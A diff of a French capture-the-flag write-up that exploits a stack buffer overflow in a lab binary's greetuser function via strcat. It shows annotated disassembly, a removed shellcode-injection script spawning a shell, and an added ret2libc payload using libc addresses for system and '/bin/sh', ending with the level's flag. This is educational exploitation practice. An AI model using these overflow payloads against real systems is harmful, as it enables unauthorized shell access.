@@ -11,48 +11,48 @@
  8048499:	85 c0                	test   eax,eax
  804849b:	75 6d                	jne    804850a <greetuser+0x86>	; if (global_1 != 0)
  804849d:	ba 10 87 04 08       	mov    edx,0x8048710			; "Hello "
- 80484a2:	8d 45 b8             	lea    eax,[ebp-0x48]			; on charge une adresse (0x0804823c)
+ 80484a2:	8d 45 b8             	lea    eax,[ebp-0x48]			; char result[72];
  80484a5:	8b 0a                	mov    ecx,DWORD PTR [edx]
- 80484a7:	89 08                	mov    DWORD PTR [eax],ecx		; *eax = "Hello "
- 80484a9:	0f b7 4a 04          	movzx  ecx,WORD PTR [edx+0x4]	; ecx = "o"
- 80484ad:	66 89 48 04          	mov    WORD PTR [eax+0x4],cx	; eax[4] = "o"
- 80484b1:	0f b6 52 06          	movzx  edx,BYTE PTR [edx+0x6]	; edx = \0
- 80484b5:	88 50 06             	mov    BYTE PTR [eax+0x6],dl	; eax[6] = 0;
+ 80484a7:	89 08                	mov    DWORD PTR [eax],ecx		; *eax = "Hell"
+ 80484a9:	0f b7 4a 04          	movzx  ecx,WORD PTR [edx+0x4]
+ 80484ad:	66 89 48 04          	mov    WORD PTR [eax+0x4],cx	; eax + 4 = "o "
+ 80484b1:	0f b6 52 06          	movzx  edx,BYTE PTR [edx+0x6]	; edx + 6 = \0
+ 80484b5:	88 50 06             	mov    BYTE PTR [eax+0x6],dl	; result = "Hello "
  80484b8:	eb 50                	jmp    804850a <greetuser+0x86>
- 80484ba:	ba 17 87 04 08       	mov    edx,0x8048717			; qqc -- pas une string
- 80484bf:	8d 45 b8             	lea    eax,[ebp-0x48]			; on charge une adresse (0x0804823c)
+ 80484ba:	ba 17 87 04 08       	mov    edx,0x8048717			; "Hyvää päivää "
+ 80484bf:	8d 45 b8             	lea    eax,[ebp-0x48]			; char result[72];
  80484c2:	8b 0a                	mov    ecx,DWORD PTR [edx]
  80484c4:	89 08                	mov    DWORD PTR [eax],ecx		; *eax = 0x8048717
  80484c6:	8b 4a 04             	mov    ecx,DWORD PTR [edx+0x4]
- 80484c9:	89 48 04             	mov    DWORD PTR [eax+0x4],ecx	; eax[4] = &edx[4] (0xa4)
+ 80484c9:	89 48 04             	mov    DWORD PTR [eax+0x4],ecx	; eax + 4 = edx + 4
  80484cc:	8b 4a 08             	mov    ecx,DWORD PTR [edx+0x8]
- 80484cf:	89 48 08             	mov    DWORD PTR [eax+0x8],ecx	; eax[8] = &edx[8]
+ 80484cf:	89 48 08             	mov    DWORD PTR [eax+0x8],ecx	; eax + 8 = edx + 8
  80484d2:	8b 4a 0c             	mov    ecx,DWORD PTR [edx+0xc]
- 80484d5:	89 48 0c             	mov    DWORD PTR [eax+0xc],ecx	; eax[12] = &edx[12]
+ 80484d5:	89 48 0c             	mov    DWORD PTR [eax+0xc],ecx	; eax + 12 = edx + 12
  80484d8:	0f b7 4a 10          	movzx  ecx,WORD PTR [edx+0x10]
- 80484dc:	66 89 48 10          	mov    WORD PTR [eax+0x10],cx	; eax[16] = *(edx + 16)
+ 80484dc:	66 89 48 10          	mov    WORD PTR [eax+0x10],cx	; eax + 16 = edx
  80484e0:	0f b6 52 12          	movzx  edx,BYTE PTR [edx+0x12]
- 80484e4:	88 50 12             	mov    BYTE PTR [eax+0x12],dl	; eax[18] = *(edx + 18)
+ 80484e4:	88 50 12             	mov    BYTE PTR [eax+0x12],dl	; eax + 18 = edx
  80484e7:	eb 21                	jmp    804850a <greetuser+0x86>
  80484e9:	ba 2a 87 04 08       	mov    edx,0x804872a			; edx = "Goedemiddag! "
- 80484ee:	8d 45 b8             	lea    eax,[ebp-0x48]			; on charge une adresse (0x0804823c)
+ 80484ee:	8d 45 b8             	lea    eax,[ebp-0x48]			; char result[72];
  80484f1:	8b 0a                	mov    ecx,DWORD PTR [edx]
- 80484f3:	89 08                	mov    DWORD PTR [eax],ecx		; *0x0804823c = &"Goedemiddag! "
+ 80484f3:	89 08                	mov    DWORD PTR [eax],ecx		; result = "Goedemiddag! "
  80484f5:	8b 4a 04             	mov    ecx,DWORD PTR [edx+0x4]
- 80484f8:	89 48 04             	mov    DWORD PTR [eax+0x4],ecx	; 0x0804823c[4] = edx + 4
+ 80484f8:	89 48 04             	mov    DWORD PTR [eax+0x4],ecx
  80484fb:	8b 4a 08             	mov    ecx,DWORD PTR [edx+0x8]
- 80484fe:	89 48 08             	mov    DWORD PTR [eax+0x8],ecx	; 0x0804823c[8] = edx + 8
+ 80484fe:	89 48 08             	mov    DWORD PTR [eax+0x8],ecx
  8048501:	0f b7 52 0c          	movzx  edx,WORD PTR [edx+0xc]
- 8048505:	66 89 50 0c          	mov    WORD PTR [eax+0xc],dx	; 0x0804823c[12] = *(edx + 12) = ' '
+ 8048505:	66 89 50 0c          	mov    WORD PTR [eax+0xc],dx
  8048509:	90                   	nop
  804850a:	8d 45 08             	lea    eax,[ebp+0x8]
  804850d:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
  8048511:	8d 45 b8             	lea    eax,[ebp-0x48]
  8048514:	89 04 24             	mov    DWORD PTR [esp],eax
- 8048517:	e8 54 fe ff ff       	call   8048370 <strcat@plt>		; strcat(0x0804823c, ebp+0x8)
+ 8048517:	e8 54 fe ff ff       	call   8048370 <strcat@plt>		; strcat(result, ebp+0x8)
  804851c:	8d 45 b8             	lea    eax,[ebp-0x48]
  804851f:	89 04 24             	mov    DWORD PTR [esp],eax
- 8048522:	e8 69 fe ff ff       	call   8048390 <puts@plt>		; puts(0x0804823c)
+ 8048522:	e8 69 fe ff ff       	call   8048390 <puts@plt>		; puts(result)
  8048527:	c9                   	leave  
  8048528:	c3                   	ret    
 
@@ -138,46 +138,58 @@
  8048637:	c3                   	ret
 ```
 
-Après un test avec GDB, on peut clairement voir qu'on override une return adress lorsque la variable d'environnement LANG=fi.
-Donc injection de shell code ou ret2libc.
+Du coup, on peut overflow la variable nommée `str_store` dans le programme `.c`. Elle contiendra au maximum 72 caractères.
+Or, si on donne `fi` en variable d'environnement `LANG`, alors les 19 premiers octets sont pris, ce qui laisse 53 caractère à overflow.
 
-Disons injection de shell code. Déterminons l'adresse de retour qui est écrasée, et ce qui a dans la stack à ce moment-là.
+Pour rappel, dans le main on rempli un buffer de 76 caractères disponibles, et on peut en écrire 72. Par conséquent, on peut overflow d'au maximum 18 caractères.
+La question sera de savoir si le shell code est conservé ou non après.
 
-En reprenant mon programme JS du bonus0, j'ai pu générer deux strings de 160 caractères:
+Répartition de la mémoire dans le programme :
 ```
-(gdb) set arg 1234567891122334455667788991112223334445556667778889991111222233334444555566667777888899991111122222333334444455555666667777788888999991111112222223333334444445 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZaabbccddeeffgghhiijjkkllmmnnooppqqrrssttuuvvwwxxyyzzAABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPQQRRSSTTUUVVWWXXYYZZaaab
-(gdb) r
+char str[76]:
+[0 <- argv[1] -> 40 <- argv[2] -> 72]
 
-0x76757473 in ?? ()
-```
+char str_store[72]:
+[0 <- local_str -> 19 <- str -> 91]
 
-Donc on segfault à `stuv` donc au 19e caractère. Après avoir mis un breakpoint sur le `ret` du main et du `greetuser`, j'ai pu déterminer que la fonction avait segfault au niveau du ret de `greetuser`.
-
-On peut également remarquer notre injection à l'adresse : `0xbffff5a0`, qui contient : `0x34333231` = 1234, donc le début de la première string.
-
-C'est l'heure de la payload !
-
-```py
-import sys
-
-shell_code = ("\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70" +
-		"\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61" +
-		"\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52" +
-		"\x51\x53\x89\xe1\xcd\x80")
-
-shell_code = shell_code + ("A" * (160 - len(shell_code)))
-address = "\xa0\xf5\xff\xbf"
-
-if len(sys.argv) > 1 and sys.argv[1] == '1':
-	print(shell_code)
-else:
-	address = "\xa0\xf5\xff\xbf"
-	print("abcdefghijklmnopqr" + address + "wxyzABCDEFGHIJKLMNOPQRSTUVWXYZaabbccddeeffgghhiijjkkllmmnnooppqqrrssttuuvvwwxxyyzzAABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPQQRRSSTTUUVVWWXXYYZZaaab")
+[0 <- local_str -> 19 <- argv[1] -> 59 <- argv[2] -> 91]
 ```
 
-Et:
+Il ne reste plus qu'à déterminer l'adresse 0 (`ebp-0x48`) avec gdb:
+`0xbffff4f0`
+
+Donc notre adresse sera : `0xbffff503`.
+
+L'idée est donc:
+1. Définir `LANG=fi`
+2. Écrire n'importe quoi dans `argv[1]`
+3. Écrire 18 caractères dans `argv[2]`
+4. Écrire l'adresse `\x03\xf5\xff\xbf`
+
+Au vu de la place qu'on a dans la stack, c'est probablement une `ret2libc`. Il me faut juste vérifier que ça segfault au bon endroit.
+
+Après avoir run le code, segfault à `bffff5` (`demsg`).
+
+Adresse de `system` (`"\x60\xb0\xe6\xb7"`) et `/bin/sh` (`"\x58\xcc\xf8\xb7"`)
+
+```
+(gdb) x/1s 0xb7f8cc58
+0xb7f8cc58:	 "/bin/sh"
+(gdb) x/10xw system
+0xb7e6b060 <system>:	0x891cec83 [...]
+```
+
+L'idée est donc:
+1. Définir `LANG=fi`
+2. Écrire n'importe quoi dans `argv[1]`
+3. Écrire 18 caractères dans `argv[2]`
+4. Écrire l'adresse `\x60\xb0\xe6\xb7`
+4. Écrire des NOP codes pour l'adresse de retour `\x90\x90\x90\x90`
+4. Écrire l'argument `\x58\xcc\xf8\xb7`
+
 ```sh
-LANG=fi; ./bonus2 "`python /tmp/payload.py 1`" "`python /tmp/payload.py`"
+export LANG=fi
+./bonus2 `python -c 'print "A" * 41'` `python -c 'print "A" * 18 + "\x60\xb0\xe6\xb7\x90\x90\x90\x90\x58\xcc\xf8\xb7"'`
 ```
 
-segfault à `rqps`! Bon, c'est pas ouf.
+`71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587`
